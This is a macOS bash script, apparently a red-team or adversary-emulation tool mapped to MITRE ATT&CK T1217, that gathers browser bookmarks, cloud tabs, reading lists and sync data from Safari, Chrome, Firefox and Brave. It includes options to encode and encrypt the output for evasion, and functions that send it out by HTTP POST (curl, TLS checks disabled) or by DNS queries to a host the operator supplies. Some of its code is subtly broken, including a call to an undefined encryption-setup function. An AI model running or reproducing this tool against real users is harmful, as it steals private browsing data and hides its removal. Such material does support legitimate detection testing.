
# Script Name: browser_bookmarks.sh
# MITRE ATT&CK Technique: T1217 - Browser Bookmark Discovery
# Tactic: Discovery
# Platform: macOS

# Author: @darmado x.com/darmad0
# Date: Sun Oct 20 22:34:04 PDT 2024
# Version: 1.2

# Description:
# This script extracts browser bookmarks from Safari, Chrome, Firefox, and Brave on macOS systems.
# It follows MITRE ATT&CK Technique T1217: Browser Bookmark Discovery.
# The script uses native macOS commands and APIs for maximum compatibility.

# References:
# - https://attack.mitre.org/techniques/T1217/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md

#------------------------------------------------------------------------------
# Configuration Section
#------------------------------------------------------------------------------

# Core Commands
CMD_SQLITE3="/usr/bin/sqlite3"
CMD_PLUTIL="/usr/bin/plutil"
CMD_CAT="/usr/bin/cat"
CMD_OPENSSL="/usr/bin/openssl"
CMD_BASE64="/usr/bin/base64"

# Optional Commands
CMD_GPG="/usr/local/bin/gpg"
CMD_XXD="/usr/bin/xxd"
CMD_UUENCODE="/usr/bin/uuencode"
CMD_PERL="/usr/bin/perl"
CMD_DIG="/usr/bin/dig"
CMD_CURL="/usr/bin/curl"

# Command Options
CMD_SQLITE3_OPTS=(-separator '|' -readonly true -noheader)
CMD_GPG_OPTS="--batch --yes"
CMD_CURL_OPTS="-L -s -X POST"
CMD_CURL_TIMEOUT="--connect-timeout 5 --max-time 10 --retry 1 --retry-delay 0"
CMD_CURL_SECURITY="--fail-with-body --insecure"

# HTTP Headers
HTTP_HEADERS=(
    "Host: \${host}"
    "User-Agent: $USER_AGENT"
    "Accept: */*"
    "Content-Type: application/json"
    "Connection: keep-alive"
)

# MITRE ATT&CK Mappings
TACTIC="Discovery"
TTP_ID="T1217"
SUBTECHNIQUE_ID="T1217.001"

TACTIC_ENCRYPT="Defense Evasion"
TTP_ID_ENCRYPT="T1027"

TACTIC_ENCODE="Defense Evasion"
TTP_ID_ENCODE="T1140"

TTP_ID_ENCODE_BASE64="T1027.001"
TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
TTP_ID_ENCODE_PERL="T1059.006"

# Global Variables
NAME="browser_bookmarks"
ALL=false
DEBUG=false
ENCODE="none"
FORMAT=""
EXFIL=false
ENCRYPT="none"
ENCRYPT_KEY=""
PROXY=""
LOG_ENABLED=false

# Browser Selection Flags
SAFARI=false
CHROME=false
FIREFOX=false
BRAVE=false

# Browser Database Paths
SAFARI_BOOKMARKS=(
    "$HOME/Library/Containers/com.apple.Safari/Data/Library/Safari/Bookmarks.plist"
    "$HOME/Library/Safari/Bookmarks.plist"
)
SAFARI_CLOUD_TABS=(
    "$HOME/Library/Safari/CloudTabs.db"
    "$HOME/Library/Containers/com.apple.Safari/Data/Library/Safari/CloudTabs.db"
)
SAFARI_READING_LIST=(
    "$HOME/Library/Safari/ReadingList.plist"
    "$HOME/Library/Containers/com.apple.Safari/Data/Library/Safari/ReadingList.plist"
)

CHROME_BOOKMARKS="$HOME/Library/Application Support/Google/Chrome/Default/Bookmarks"
CHROME_FAVICONS="$HOME/Library/Application Support/Google/Chrome/Default/Favicons"
CHROME_TOP_SITES="$HOME/Library/Application Support/Google/Chrome/Default/Top Sites"
CHROME_SYNC="$HOME/Library/Application Support/Google/Chrome/Default/Sync Data"
CHROME_EXTENSIONS="$HOME/Library/Application Support/Google/Chrome/Default/Extensions"
CHROME_STATE="$HOME/Library/Application Support/Google/Chrome/Default/Local State"

FIREFOX_PROFILE=$(find ~/Library/Application\ Support/Firefox/Profiles/*.default-release -maxdepth 0 -type d 2>/dev/null | head -n 1)
FIREFOX_BOOKMARKS="${FIREFOX_PROFILE}/places.sqlite"
FIREFOX_FAVICONS="${FIREFOX_PROFILE}/favicons.sqlite"
FIREFOX_SYNC="${FIREFOX_PROFILE}/weave/bookmarks.json"
FIREFOX_EXT_DATA="${FIREFOX_PROFILE}/browser-extension-data"
FIREFOX_SESSIONSTORE="${FIREFOX_PROFILE}/sessionstore-backups/recovery.jsonlz4"

BRAVE_BOOKMARKS="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Bookmarks"
BRAVE_FAVICONS="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Favicons"
BRAVE_TOP_SITES="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Top Sites"
BRAVE_SYNC="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Sync Data"
BRAVE_EXTENSIONS="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Extensions"
BRAVE_STATE="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local State"

# SQL Queries
SAFARI_CLOUDTABS_QUERY="SELECT device_name, title, url FROM cloud_tabs"
SAFARI_HISTORY_QUERY="SELECT url, title FROM history_items WHERE url LIKE '%bookmark%' OR title LIKE '%bookmark%'"

CHROME_FAVICONS_QUERY="SELECT url, icon_mapping.page_url FROM favicons JOIN icon_mapping"
CHROME_TOPSITES_QUERY="SELECT url, title FROM top_sites"

FIREFOX_BOOKMARKS_QUERY="
SELECT b.title, p.url, b.dateAdded
FROM moz_bookmarks b
JOIN moz_places p ON b.fk = p.id
WHERE b.type = 1
ORDER BY b.dateAdded DESC"

FIREFOX_FAVICONS_QUERY="
SELECT moz_pages_w_icons.url, moz_icons.data 
FROM moz_icons 
JOIN moz_icons_to_pages ON moz_icons.id = moz_icons_to_pages.icon_id 
JOIN moz_pages_w_icons ON moz_icons_to_pages.page_id = moz_pages_w_icons.id"

# Logging Configuration
LOG_DIR="$(dirname "$0")/../../../logs"
LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
LOG_MAX_SIZE=$((5 * 1024 * 1024))

# Input Parameters
INPUT_SEARCH=""
INPUT_DAYS=7
INPUT_START_TIME=""
INPUT_END_TIME=""
INPUT_EXFIL_METHOD=""
INPUT_EXFIL_URI=""

# Encryption methods
ENCRYPT_METHODS="none gpg aes"

# Encryption function
encrypt_data() {
    local data="$1"
    local method="$2"
    local key="$3"

    case "$method" in
        aes)
            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        gpg)
            echo "$data" | gpg --batch --yes --passphrase "$key" --symmetric --armor
            ;;
        *)
            echo "Unsupported encryption method: $method" >&2
            return 1
            ;;
    esac
}

# Validate required commands with better error handling
validate_commands() {
    # Check core commands - these are required
    [ ! -x "$CMD_SQLITE3" ] && echo "Error: sqlite3 not found at $CMD_SQLITE3" >&2 && return 1
    [ ! -x "$CMD_PLUTIL" ] && echo "Error: plutil not found at $CMD_PLUTIL" >&2 && return 1
    [ ! -x "$CMD_OPENSSL" ] && echo "Error: openssl not found at $CMD_OPENSSL" >&2 && return 1
    [ ! -x "$CMD_BASE64" ] && echo "Error: base64 not found at $CMD_BASE64" >&2 && return 1
    
    # Check optional commands based on features enabled
    if [ "$ENCRYPT" != "none" ] && [ ! -x "$CMD_GPG" ]; then
        [ "$DEBUG" = true ] && echo "Warning: gpg not found at $CMD_GPG - encryption disabled" >&2
    fi
    
    if [ "$ENCODE" != "none" ]; then
        [ ! -x "$CMD_XXD" ] && [ "$DEBUG" = true ] && echo "Warning: xxd not found at $CMD_XXD - hex encoding disabled" >&2
        [ ! -x "$CMD_PERL" ] && [ "$DEBUG" = true ] && echo "Warning: perl not found at $CMD_PERL - advanced encoding disabled" >&2
    fi
    
    if [ "$EXFIL" = true ]; then
        case "$INPUT_EXFIL_METHOD" in
            "http") [ ! -x "$CMD_CURL" ] && [ "$DEBUG" = true ] && echo "Warning: curl not found at $CMD_CURL - HTTP exfiltration disabled" >&2 ;;
            "dns") [ ! -x "$CMD_DIG" ] && [ "$DEBUG" = true ] && echo "Warning: dig not found at $CMD_DIG - DNS exfiltration disabled" >&2 ;;
        esac
    fi
    
    return 0
}

# Display help message
display_help() {
    cat << EOF
Usage: $(basename "$0") [options]

Description: Extract browser bookmarks from Safari, Chrome, Firefox, and Brave browsers
MITRE ATT&CK: T1217 - Browser Information Discovery

Browser Selection:
  -a, --all                 Extract from all browsers
  --safari-bookmarks        Extract Safari bookmarks from plist
  --safari-cloud            Extract Safari cloud tabs
  --safari-reading          Extract Safari reading list
  -c, --chrome              Extract Chrome bookmarks
  -f, --firefox             Extract Firefox bookmarks
  -b, --brave               Extract Brave bookmarks

Search Options:
  --search TERM             Search bookmarks for specific terms
  --last NUMBER             Last N days (default: 7)
  --starttime TIMESTAMP     Start time (YYYY-MM-DD HH:MM:SS)
  --endtime TIMESTAMP       End time (YYYY-MM-DD HH:MM:SS)

Output Options:
  -l, --log                 Log output to file
  --format TYPE             Output format (json|csv|raw)
  --encode TYPE             Encode output (b64|hex|perl)
  --encrypt METHOD          Encrypt output (aes|gpg)
  --proxy PROXY             Use proxy for HTTP requests
  --debug                   Enable debug output

Exfiltration:
  --exfilhttp URI          Exfiltrate via HTTPS POST
  --exfildns DOMAIN        Exfiltrate via DNS queries
EOF
}

# Get current user: used for logs only
get_user() {
    USER=$(whoami)
}

# Function to get the current timestamp
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

# Log output with rotation
log_output() {
    local OUTPUT="$1"
    local FULL_LOG_PATH="${LOG_DIR}/${LOG_FILE_NAME}"
    local TIMESTAMP
    local PID
    local USER
    local FUNC
    local HOSTNAME
    
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    PID=$$
    USER=$(whoami)
    FUNC=${FUNCNAME[1]:-main}
    HOSTNAME=$(hostname)
    
    if [ "$LOG_ENABLED" = true ]; then
        mkdir -p "$LOG_DIR" 2>/dev/null
        touch "$FULL_LOG_PATH" 2>/dev/null
        
        printf '%s %s %s[%d]: [%s] [%s] type=%s ttp_id=%s tactic=%s command="browser bookmark discovery" status=success data="%s"\n' \
            "$TIMESTAMP" \
            "$HOSTNAME" \
            "$NAME" \
            "$PID" \
            "$USER" \
            "$FUNC" \
            "$NAME" \
            "$TTP_ID" \
            "$TACTIC" \
            "$OUTPUT" >> "$FULL_LOG_PATH"
        
        if [ -f "$FULL_LOG_PATH" ]; then
            SIZE=$(stat -f%z "$FULL_LOG_PATH")
            if [ -n "$SIZE" ] && [ "$SIZE" -ge "$LOG_MAX_SIZE" ]; then
                mv "$FULL_LOG_PATH" "${FULL_LOG_PATH}.old"
                touch "$FULL_LOG_PATH"
            fi
        fi
    else
        printf '%s\n' "$OUTPUT"
    fi
}

# Generate encryption key
generate_random_key() {
    openssl rand -base64 32 | tr -d '\n/'
}

# Function to check browser data source access
check_data_source() {
    local source_type="$1"
    local source_path="$2"
    
    case "$source_type" in
        plist|sqlite|json)
            check_perms "$source_path" "r"
            return $?
            ;;
        dir)
            [ -d "$source_path" ] && [ -r "$source_path" ]
            return $?
            ;;
        *)
            return 1
            ;;
    esac
}

# Function to check file permissions
check_perms() {
    local file="$1"
    local perm="$2"  # r for read, w for write, x for execute
    
    if [ ! -e "$file" ]; then
        [ "$DEBUG" = true ] && log_output "WARNING: File does not exist: $file"
        return 1
    fi
    
    case "$perm" in
        r) [ -r "$file" ] || return 1 ;;
        w) [ -w "$file" ] || return 1 ;;
        x) [ -x "$file" ] || return 1 ;;
        *) return 1 ;;
    esac
    
    return 0
}

# Function to validate browser sources
validate_browser_sources() {
    local browser="$1"
    local error_count=0
    
    case "$browser" in
        safari)
            check_perms "$SAFARI_BOOKMARKS" "r" || ((error_count++))
            check_perms "$SAFARI_CLOUD_TABS" "r" || ((error_count++))
            check_perms "$SAFARI_READING_LIST" "r" || ((error_count++))
            ;;
        chrome)
            check_perms "$CHROME_BOOKMARKS" "r" || ((error_count++))
            check_perms "$CHROME_SYNC" "r" || ((error_count++))
            check_perms "$CHROME_EXTENSIONS" "r" || ((error_count++))
            ;;
        firefox)
            check_perms "$FIREFOX_BOOKMARKS" "r" || ((error_count++))
            [ -d "$FIREFOX_BOOKMARK_BACKUPS" ] || ((error_count++))
            check_perms "$FIREFOX_SYNC" "r" || ((error_count++))
            ;;
        brave)
            check_perms "$BRAVE_BOOKMARKS" "r" || ((error_count++))
            check_perms "$BRAVE_SYNC" "r" || ((error_count++))
            check_perms "$BRAVE_EXTENSIONS" "r" || ((error_count++))
            ;;
    esac
    
    [ "$error_count" -gt 0 ] && [ "$DEBUG" = true ] && \
        log_output "WARNING: Some $browser data sources are not accessible ($error_count sources failed)"
    
    return $error_count
}

# Main function
main() {
    # Validate commands
    validate_commands || exit 1

    local all_output=""

    # Collect data from selected browsers
    if [ "$ALL" = true ] || [ "$SAFARI_BOOKMARKS_ENABLED" = true ]; then
        local safari_out=""
        safari_out+=$(safari_bookmarks)
        [ -n "$safari_out" ] && all_output="${all_output}${safari_out}\n"
    fi

    if [ "$ALL" = true ] || [ "$SAFARI_CLOUD_ENABLED" = true ]; then
        local cloud_out=""
        cloud_out+=$(safari_cloud_bookmarks)
        [ -n "$cloud_out" ] && all_output="${all_output}${cloud_out}\n"
    fi

    if [ "$ALL" = true ] || [ "$SAFARI_READING_LIST_ENABLED" = true ]; then
        local reading_out=""
        reading_out+=$(safari_reading_list)
        [ -n "$reading_out" ] && all_output="${all_output}${reading_out}\n"
    fi

    if [ "$ALL" = true ] || [ "$FIREFOX" = true ]; then
        local firefox_out=""
        firefox_out+=$(firefox_bookmarks)
        firefox_out+=$(firefox_bookmark_backups)
        firefox_out+=$(firefox_sync_bookmarks)
        [ -n "$firefox_out" ] && all_output="${all_output}${firefox_out}\n"
    fi

    if [ "$ALL" = true ] || [ "$CHROME" = true ]; then
        local chrome_out=""
        chrome_out+=$(chrome_bookmarks)
        chrome_out+=$(chrome_sync_bookmarks)
        [ -n "$chrome_out" ] && all_output="${all_output}${chrome_out}\n"
    fi

    if [ "$ALL" = true ] || [ "$BRAVE" = true ]; then
        local brave_out=""
        brave_out+=$(brave_bookmarks)
        brave_out+=$(brave_sync_bookmarks)
        [ -n "$brave_out" ] && all_output="${all_output}${brave_out}\n"
    fi

    # Process and output the collected data
    if [ -n "$all_output" ]; then
        # Apply search filter if specified
        if [ -n "$INPUT_SEARCH" ]; then
            all_output=$(printf '%s' "$all_output" | grep -i "$INPUT_SEARCH" || true)
        fi

        # Apply time filter if specified
        if [ -n "$INPUT_START_TIME" ] || [ -n "$INPUT_END_TIME" ] || [ -n "$INPUT_DAYS" ]; then
            local temp_output=""
            while IFS='|' read -r source title url date count; do
                local bookmark_time
                if [[ "$date" =~ ^[0-9]+$ ]]; then
                    bookmark_time="$date"
                else
                    bookmark_time=$(date -j -f "%Y-%m-%d %H:%M:%S" "$date" "+%s" 2>/dev/null || echo "0")
                fi

                # Skip if before start time
                if [ -n "$INPUT_START_TIME" ] && [ "$bookmark_time" -lt "$INPUT_START_TIME" ]; then
                    continue
                fi

                # Skip if after end time
                if [ -n "$INPUT_END_TIME" ] && [ "$bookmark_time" -gt "$INPUT_END_TIME" ]; then
                    continue
                fi

                # Skip if older than INPUT_DAYS
                if [ -n "$INPUT_DAYS" ]; then
                    local cutoff_time=$(($(date "+%s") - (INPUT_DAYS * 86400)))
                    if [ "$bookmark_time" -lt "$cutoff_time" ]; then
                        continue
                    fi
                fi

                temp_output="${temp_output}${source}|${title}|${url}|${date}|${count}\n"
            done <<< "$all_output"
            all_output="$temp_output"
        fi

        # Format output
        if [ -n "$FORMAT" ]; then
            all_output=$(format_output "$all_output" "$FORMAT")
        fi

        # Handle encoding
        if [ "$ENCODE" != "none" ]; then
            all_output=$(encode_output "$all_output" "$ENCODE")
        fi

        # Handle encryption
        if [ "$ENCRYPT" != "none" ]; then
            all_output=$(encrypt_data "$all_output" "$ENCRYPT" "$ENCRYPT_KEY")
        fi

        # Output or log
        if [ "$LOG_ENABLED" = true ]; then
            log_output "$all_output"
        else
            printf '%s\n' "$all_output"
        fi

        # Handle exfiltration
        if [ "$EXFIL" = true ]; then
            case "$INPUT_EXFIL_METHOD" in
                http) exfiltrate_http "$all_output" "$INPUT_EXFIL_URI" "$PROXY" ;;
                dns) exfiltrate_dns "$all_output" "$INPUT_EXFIL_URI" ;;
            esac
        fi
    fi

    return 0
}

# Function to extract Safari bookmarks
safari_bookmarks() {
    local found=false
    
    for plist in "${SAFARI_BOOKMARKS[@]}"; do
        if [ -f "$plist" ] && [ -r "$plist" ]; then
            [ "$DEBUG" = true ] && printf "Found Safari bookmarks at: %s\\n" "$plist" >&2
            found=true
            printf "%s\n" "$("$CMD_PLUTIL" -p "$plist")"
        fi
    done

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Safari bookmark files found\\n" >&2
        return 1
    fi
}

# Function to extract Safari cloud bookmarks
safari_cloud_bookmarks() {
    local found=false
    
    for db in "${SAFARI_CLOUD_TABS[@]}"; do
        if [ -f "$db" ] && [ -r "$db" ]; then
            [ "$DEBUG" = true ] && printf "Found Safari cloud tabs at: %s\\n" "$db" >&2
            found=true
            
            # Test database access first
            if ! $CMD_SQLITE3 "$db" "SELECT count(*) FROM sqlite_master WHERE type='table' AND name='cloud_tabs';" >/dev/null 2>&1; then
                [ "$DEBUG" = true ] && printf "Failed to access cloud_tabs table in: %s\\n" "$db" >&2
                continue
            fi
            
            # Extract cloud tabs with proper error handling
            local result
            result=$($CMD_SQLITE3 "${CMD_SQLITE3_OPTS[@]}" "$db" \
                "SELECT 'Safari Cloud', title, url FROM cloud_tabs WHERE url IS NOT NULL AND title IS NOT NULL;" 2>/dev/null)
            if [ $? -eq 0 ] && [ -n "$result" ]; then
                printf '%s\n' "$result"
            else
                [ "$DEBUG" = true ] && printf "No cloud tabs found in: %s\\n" "$db" >&2
            fi
        fi
    done

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Safari cloud tab files found\\n" >&2
        return 1
    fi
}

# Function to extract Safari reading list
safari_reading_list() {
    local found=false
    
    for plist in "${SAFARI_READING_LIST[@]}"; do
        if [ -f "$plist" ] && [ -r "$plist" ]; then
            [ "$DEBUG" = true ] && printf "Found Safari reading list at: %s\\n" "$plist" >&2
            found=true
            
            # Convert plist to xml1 format for parsing
            if [ "$DEBUG" = true ]; then
                printf "Converting Safari reading list to XML: %s\n" "$plist" >&2
            fi
            $CMD_PLUTIL -convert xml1 -o - "$plist" 2>/dev/null | grep -E "<string>|<key>" | \
                sed -n 's/.*<key>URLString<\/key>.*<string>\(.*\)<\/string>.*/Safari Reading List|\1/p'
        fi
    done

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Safari reading list files found\\n" >&2
        return 1
    fi
}

# Function to extract Firefox bookmarks
firefox_bookmarks() {
    local found=false
    
    if [ -f "$FIREFOX_BOOKMARKS" ] && [ -r "$FIREFOX_BOOKMARKS" ]; then
        [ "$DEBUG" = true ] && printf "Found Firefox bookmarks at: %s\\n" "$FIREFOX_BOOKMARKS" >&2
        found=true
        printf "\\n[Firefox Bookmarks]\\n"
        $CMD_SQLITE3 "$FIREFOX_BOOKMARKS" "SELECT DISTINCT b.title || ' | ' || p.url 
            FROM moz_bookmarks b 
            JOIN moz_places p ON b.fk = p.id 
            WHERE b.type = 1 AND b.title IS NOT NULL 
            ORDER BY b.dateAdded DESC" 2>/dev/null || true
    fi

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Firefox bookmark files found\\n" >&2
        return 1
    fi
}

# Function to extract Firefox sync bookmarks
firefox_sync_bookmarks() {
    local found=false
    
    if [ -f "$FIREFOX_SYNC" ] && [ -r "$FIREFOX_SYNC" ]; then
        [ "$DEBUG" = true ] && printf "Found Firefox sync data at: %s\\n" "$FIREFOX_SYNC" >&2
        found=true
        printf "\\n[Firefox Sync Bookmarks]\\n"
        $CMD_CAT "$FIREFOX_SYNC" 2>/dev/null | grep -E '"title"|"url"' || true
    fi

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Firefox sync files found\\n" >&2
        return 1
    fi
}

# Function to extract Firefox bookmark backups
firefox_bookmark_backups() {
    local found=false
    local backup_dir="$FIREFOX_PROFILE/bookmarkbackups"
    
    if [ -d "$backup_dir" ] && [ -r "$backup_dir" ]; then
        [ "$DEBUG" = true ] && printf "Found Firefox bookmark backups at: %s\\n" "$backup_dir" >&2
        found=true
        printf "\\n[Firefox Bookmark Backups]\\n"
        local latest_backup=$(ls -t "$backup_dir"/*.jsonlz4 2>/dev/null | head -1)
        if [ -n "$latest_backup" ]; then
            printf "Latest backup: %s\\n" "$(basename "$latest_backup")"
        fi
    fi

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Firefox bookmark backups found\\n" >&2
        return 1
    fi
}

# Function to extract Chrome bookmarks
chrome_bookmarks() {
    local found=false
    
    if [ -f "$CHROME_BOOKMARKS" ] && [ -r "$CHROME_BOOKMARKS" ]; then
        [ "$DEBUG" = true ] && printf "Found Chrome bookmarks at: %s\\n" "$CHROME_BOOKMARKS" >&2
        found=true
        printf "\\n[Chrome Bookmarks]\\n"
        $CMD_CAT "$CHROME_BOOKMARKS" 2>/dev/null | grep -E '"name"|"url"' | sed 's/^[[:space:]]*"name":[[:space:]]*"\(.*\)",*/Name: \1/;s/^[[:space:]]*"url":[[:space:]]*"\(.*\)",*/URL: \1\n/' || true
    fi

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Chrome bookmark files found\\n" >&2
        return 1
    fi
}

# Function to extract Chrome sync bookmarks
chrome_sync_bookmarks() {
    local found=false
    
    if [ -f "$CHROME_SYNC" ] && [ -r "$CHROME_SYNC" ]; then
        [ "$DEBUG" = true ] && printf "Found Chrome sync data at: %s\\n" "$CHROME_SYNC" >&2
        found=true
        printf "\\n[Chrome Sync Bookmarks]\\n"
        $CMD_CAT "$CHROME_SYNC" 2>/dev/null | grep -E '"name"|"url"' | sed 's/^[[:space:]]*"name":[[:space:]]*"\(.*\)",*/Name: \1/;s/^[[:space:]]*"url":[[:space:]]*"\(.*\)",*/URL: \1\n/' || true
    fi

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Chrome sync files found\\n" >&2
        return 1
    fi
}

# Function to extract Brave bookmarks
brave_bookmarks() {
    local found=false
    
    if [ -f "$BRAVE_BOOKMARKS" ] && [ -r "$BRAVE_BOOKMARKS" ]; then
        [ "$DEBUG" = true ] && printf "Found Brave bookmarks at: %s\\n" "$BRAVE_BOOKMARKS" >&2
        found=true
        printf "\\n[Brave Bookmarks]\\n"
        $CMD_CAT "$BRAVE_BOOKMARKS" 2>/dev/null | grep -E '"name"|"url"' | sed 's/^[[:space:]]*"name":[[:space:]]*"\(.*\)",*/Name: \1/;s/^[[:space:]]*"url":[[:space:]]*"\(.*\)",*/URL: \1\n/' || true
    fi

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Brave bookmark files found\\n" >&2
        return 1
    fi
}

# Function to extract Brave sync bookmarks
brave_sync_bookmarks() {
    local found=false
    
    if [ -f "$BRAVE_SYNC" ] && [ -r "$BRAVE_SYNC" ]; then
        [ "$DEBUG" = true ] && printf "Found Brave sync data at: %s\\n" "$BRAVE_SYNC" >&2
        found=true
        printf "\\n[Brave Sync Bookmarks]\\n"
        $CMD_CAT "$BRAVE_SYNC" 2>/dev/null | grep -E '"name"|"url"' | sed 's/^[[:space:]]*"name":[[:space:]]*"\(.*\)",*/Name: \1/;s/^[[:space:]]*"url":[[:space:]]*"\(.*\)",*/URL: \1\n/' || true
    fi

    if [ "$found" = false ] && [ "$DEBUG" = true ]; then
        printf "WARNING: No accessible Brave sync files found\\n" >&2
        return 1
    fi
}

# Format output in specified format (JSON/CSV)
format_output() {
    local data="$1"
    local format="${2:-raw}"
    
    case "$format" in
        json|JSON)
            printf '{"timestamp":"%s","bookmarks":[' "$(get_timestamp)"
            first=true
            printf '%s\n' "$data" | while IFS='|' read -r source title url; do
                # Skip empty lines
                [ -z "$source" ] && [ -z "$title" ] && [ -z "$url" ] && continue
                
                # Add comma for all but first item
                [ "$first" = true ] && first=false || printf ','
                
                # Clean and escape the values
                title="${title:-NO_TITLE}"
                url="${url:-NO_URL}"
                title=$(printf '%s' "$title" | sed 's/"/\\"/g')
                url=$(printf '%s' "$url" | sed 's/"/\\"/g')
                
                printf '{"source":"%s","title":"%s","url":"%s"}' "$source" "$title" "$url"
            done
            printf ']}\n'
            ;;
        csv|CSV)
            printf 'source,title,url\n'
            printf '%s\n' "$data" | while IFS='|' read -r source title url; do
                [ -z "$source" ] && [ -z "$title" ] && [ -z "$url" ] && continue
                printf '"%s","%s","%s"\n' "${source:-Unknown}" "${title:-NO_TITLE}" "${url:-NO_URL}"
            done
            ;;
        *)
            printf '%s\n' "$data"
            ;;
    esac
}

# Encode output in specified format
encode_output() {
    local data="$1"
    local encoding="${2:-none}"
    local chunk_size=63  # For DNS chunking
    
    case "$encoding" in
        b64)
            echo "$data" | base64
            ;;
        hex)
            echo "$data" | xxd -p
            ;;
        perl)
            echo "$data" | perl -pe 's/(.)/sprintf("%%%02x",ord($1))/ge'
            ;;
        *)
            echo "$data"
            ;;
    esac
}

# Exfiltrate data via HTTP POST
exfiltrate_http() {
    local data="$1"
    local uri="$2"
    local proxy="$3"
    local curl_cmd="$CMD_CURL"
    local curl_opts=($CMD_CURL_OPTS $CMD_CURL_TIMEOUT $CMD_CURL_SECURITY)
    
    # Add proxy if specified
    [ -n "$proxy" ] && curl_opts+=("--proxy" "$proxy")
    
    # Prepare headers
    local host
    host=$(echo "$uri" | awk -F/ '{print $3}')
    local headers=()
    for header in "${HTTP_HEADERS[@]}"; do
        headers+=("-H" "$(eval echo "$header")")
    done
    
    # Send data
    if ! $curl_cmd "${curl_opts[@]}" "${headers[@]}" -d "$data" "$uri" >/dev/null 2>&1; then
        [ "$DEBUG" = true ] && log_output "ERROR: Failed to exfiltrate data via HTTP"
        return 1
    fi
    return 0
}

# Exfiltrate data via DNS queries
exfiltrate_dns() {
    local data="$1"
    local domain="$2"
    local chunk_size=63  # Maximum label length in DNS
    local success=true
    
    # Split data into chunks and send DNS queries
    chunk_data "$data" "$chunk_size" | while read -r chunk; do
        if ! $CMD_DIG "@$domain" "$chunk" +short >/dev/null 2>&1; then
            [ "$DEBUG" = true ] && log_output "ERROR: Failed to exfiltrate chunk via DNS"
            success=false
            break
        fi
        sleep 0.1  # Rate limiting
    done
    
    $success
}

# Split data into chunks for DNS exfiltration
chunk_data() {
    local data="$1"
    local chunk_size="$2"
    local length=${#data}
    local offset=0
    
    while [ $offset -lt $length ]; do
        echo "${data:$offset:$chunk_size}"
        offset=$((offset + chunk_size))
    done
}

# Exit silently if no args
if [ "$#" -eq 0 ]; then
    exit 1
fi

# Argument parsing
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) display_help; exit 0 ;;
        -a|--all) 
            ALL=true
            SAFARI_BOOKMARKS_ENABLED=true
            SAFARI_CLOUD_ENABLED=true
            SAFARI_READING_LIST_ENABLED=true
            CHROME=true
            FIREFOX=true
            BRAVE=true
            ;;
        --safari-bookmarks) SAFARI_BOOKMARKS_ENABLED=true ;;
        --safari-cloud) SAFARI_CLOUD_ENABLED=true ;;
        --safari-reading) SAFARI_READING_LIST_ENABLED=true ;;
        -c|--chrome) CHROME=true ;;
        -f|--firefox) FIREFOX=true ;;
        -b|--brave) BRAVE=true ;;
        -l|--log) LOG_ENABLED=true ;;
        --search) 
            shift
            INPUT_SEARCH="$1"
            ;;
        --last) 
            shift
            INPUT_DAYS="$1"
            ;;
        --format) 
            shift
            FORMAT="$1"
            case "$FORMAT" in
                json|csv|raw) ;;
                *)
                    log_output "ERROR: Invalid format: $FORMAT. Must be json, csv, or raw"
                    exit 1
                    ;;
            esac
            ;;
        --encode) 
            shift
            ENCODE="$1"
            case "$ENCODE" in
                b64|hex|perl) ;;
                *)
                    log_output "ERROR: Invalid encoding: $ENCODE. Must be b64, hex, or perl"
                    exit 1
                    ;;
            esac
            ;;
        --encrypt)
            shift
            ENCRYPT="$1"
            if ! setup_encryption "$ENCRYPT"; then
                exit 1
            fi
            ;;
        --exfilhttp)
            shift
            EXFIL=true
            INPUT_EXFIL_METHOD="http"
            INPUT_EXFIL_URI="$1"
            ;;
        --exfildns)
            shift
            EXFIL=true
            INPUT_EXFIL_METHOD="dns"
            INPUT_EXFIL_URI="$1"
            ;;
        --proxy)
            shift
            PROXY="$1"
            if ! [[ "$PROXY" =~ ^(http|https|socks4|socks5)://[^:]+:[0-9]+$ ]]; then
                log_output "ERROR: Invalid proxy format. Must be protocol://host:port"
                exit 1
            fi
            ;;
        --starttime) 
            shift
            INPUT_START_TIME="$1"
            if ! [[ "$INPUT_START_TIME" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}\ [0-9]{2}:[0-9]{2}:[0-9]{2}$ ]]; then
                log_output "ERROR: Invalid start time format. Use YYYY-MM-DD HH:MM:SS"
                exit 1
            fi
            ;;
        --endtime) 
            shift
            INPUT_END_TIME="$1"
            if ! [[ "$INPUT_END_TIME" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}\ [0-9]{2}:[0-9]{2}:[0-9]{2}$ ]]; then
                log_output "ERROR: Invalid end time format. Use YYYY-MM-DD HH:MM:SS"
                exit 1
            fi
            ;;
        --debug) DEBUG=true ;;
        *) 
            log_output "ERROR: Invalid option: $1"
            display_help
            exit 1 
            ;;
    esac
    shift
done

# Validate browser selection - exit silently if no browser selected
if [ "$ALL" != true ] && \
   [ "$SAFARI_BOOKMARKS_ENABLED" != true ] && \
   [ "$SAFARI_CLOUD_ENABLED" != true ] && \
   [ "$SAFARI_READING_LIST_ENABLED" != true ] && \
   [ "$CHROME" != true ] && \
   [ "$FIREFOX" != true ] && \
   [ "$BRAVE" != true ]; then
    exit 1
fi

# Convert timestamps to Unix epoch if provided
